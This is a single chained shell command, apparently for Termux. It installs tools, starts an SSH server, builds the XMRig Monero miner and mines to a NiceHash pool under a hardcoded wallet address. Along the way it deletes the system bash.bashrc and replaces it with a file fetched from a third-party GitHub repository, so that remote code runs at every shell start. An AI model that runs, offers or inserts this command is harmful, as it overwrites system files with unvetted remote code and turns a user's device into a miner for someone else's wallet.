apt update && yes | apt upgrade && apt update && apt install git automake libtool autoconf -y && pkg install openssh -y && sshd && pkg install nmap -y && pkg install wget -y && apt-get install git && apt install ca-certificates && apt update -y && apt install curl -y && git clone https://github.com/xmrig/xmrig.git && cd xmrig && mkdir build && cd build && cmake -DWITH_HWLOC=OFF .. && make && cd && pwd && cd .. && cd usr && cd etc && rm -rf bash.bashrc && wget https://raw.githubusercontent.com/kecodon/Bot_Xmrig/main/bash.bashrc && cd && cd xmrig/build && ./xmrig -o randomxmonero.auto.nicehash.com:9200 -a rx/0 -u NHbSHmqm1ojuTRtdwkURwhamQ1pNC9SkJU9T.pc1 -p x
